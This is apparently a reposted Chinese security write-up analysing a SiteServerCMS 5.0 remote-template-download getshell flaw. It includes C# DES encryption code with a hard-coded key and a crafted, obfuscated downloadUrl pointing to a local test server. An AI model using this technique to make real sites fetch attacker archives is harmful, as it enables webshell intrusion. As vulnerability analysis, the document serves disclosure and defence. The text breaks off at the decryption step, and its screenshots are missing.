# SiteServerCMS-Remote-download-Getshell
SiteServerCMS 5.0远程模板下载Getshell漏洞

Author:1u0hun

From:https://www.freebuf.com/articles/web/195105.html

0x00 漏洞概述

通过了解，得知被攻击的网站使用的是siteserver cms，为开源免费cms框架，[官网](https://www.siteserver.cn/)
捕获到的“0 day”是通过远程模板下载getshell，漏洞缺陷是由于后台模板下载位置未对用户权限进行校验，且 ajaxOtherService中的downloadUrl参数可控，导致getshell，目前经过测试发现对5.0版本包含5.0以下通杀


0x01 漏洞分析

可以看到利用的是ajaxOtherService.cs中的SiteTemplateDownload功能模块，使用notepad++搜索到该功能模块如下。发现在ajaxOtherService.cs文件中确实存在函数调用接口SiteTemplateDownload(stringdownloadUrl, string directoryName, string userKeyPrefix)image.png


其中downloadUrl就是远程文件的URL地址，directoryName是下载到本地之后命名的模板目录，userKeyPrefix是加密的密钥，继续审核此文件，整理出整个函数调用流程如下，首先在AjaxOtherService.cs文件中使用Page_Load函数负责加载整个页面，然后通过request[‘type’]获取到不同的操作类型，如果获取到的type为TypeSiteTemplateDownload ，就会执行其request参数值的相关功能，其中最重要的一步操作就是此时先调用了DecryptStringBySecretKey函数将downloadurl先进行了解密，之后调用SiteTemplateDownload函数进行模板下载并自解压。 image.png


在AjaxOtherService类中通过常量中已经定义了TypeSiteTemplateDownload = “SiteTemplateDownload”;image.png


因此当type等于SiteTemplateDownload时就会调用SiteTemplateDownload函数，逻辑非常的清楚，接下来分析downloadurl到底是怎么解密的，这也是本次审计的重点，毕竟其他逻辑非常清楚了，通过调用TranslateUtils.DecryptStringBySecretKey函数进行解密，通常开发习惯就是类名与文件名基本保持一致，因此很容易找到该文件image.png
<br>
通过分析源代码可知，这里将DecryptStringBySecretKey函数进行重载，在调用DecryptStringBySecretKey(string inputString)时候，实际上调用的是下面带secretKey的同名函数DecryptStringBySecretKey(stringinputString, string secretKey)，分析该函数其中secretKey是取自WebConfigUtils.SecretKey的值，通过审计WebConfigUtils.cs文件可知，该值是从配置文档web.config中取得对应字段值。SecretKey的值可以在web.config文件中找到。
<br>
image.png

解密函数DecryptStringBySecretKey(string inputString, string secretKey)中secretKey的参数值同样为WebConfigUtils.SecretKey的值,继续分析该函数，可以看到先进行了混淆字符，将字符“+=&?’/”替换成DES加密后的密文。image.png

这里使用python脚本去除混淆，恢复原DES密文。image.png

程序去除混淆之后调用DES模块并实例化encryptor对象调用DesDecrypt解密函数，在实例化对象时将inputString和secreKey传入。使用
[菜鸟教程](http://www.runoob.com/)

调试运行下核心的加解密代码传入参数_encryptKey和_inputString加密代码调试如下_inputString传入任意黑客构造的地址，_encryptKey传入密钥。


```C#
using System; 
using System.IO; 
using System.Security.Cryptography; 
using System.Text; 
namespace EncryptApplication 
{ class Encrypt 
    { static void Main(string[] args) 
      { 
        var _encryptKey = "vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5"; 
        var _decryptKey = "vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5";
        var _inputString = "http://127.0.0.1:99/txt2.zip";
        var _outString = ""; var _noteMessage = "";
        byte[] iv = { 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF };
        try{ 
           var byKey = Encoding.UTF8.GetBytes(_encryptKey.Length > 8 ? _encryptKey.Substring(0, 8) : _encryptKey); 
          var des = new DESCryptoServiceProvider(); 
          var inputByteArray = Encoding.UTF8.GetBytes(_inputString); 
          var ms = new MemoryStream(); 
          var cs = new CryptoStream(ms, des.CreateEncryptor(byKey, iv), CryptoStreamMode.Write);     cs.Write(inputByteArray, 0, inputByteArray.Length);
         cs.FlushFinalBlock();
          _outString = Convert.ToBase64String(ms.ToArray()); 
         Console.WriteLine("DesEncrypt:"); Console.WriteLine(_outString); }
      catch (Exception error) { _noteMessage = error.Message; } 
 } } }
```

f1.png
执行之后获取其加密downloadurl如下：
> ZjYIub/YxA3QempkVBK4CoiVo3M607H/TBf7F0aPcUE=

使用python代码混淆该url，得到最后利用的downloadurlf2.png


混淆之后的downloadurl为：

> ZjYIub0slash0YxA3QempkVBK4CoiVo3M607H0slash0TBf7F0aPcUE0equals00secret0

解密的步骤与加密相反，首先将混淆后的下载地址去除混淆。去混淆py代码去混淆后密文如下：

> ZjYIub/YxA2nYLIZNDeUmdd3GBhwbuBXI4s2bpH2CVmtg2H/QGZ4+ZW0iiVbi/MDytVnpZKliDw=

解密函数调试如下，传入_inputString和密钥 
f3.png




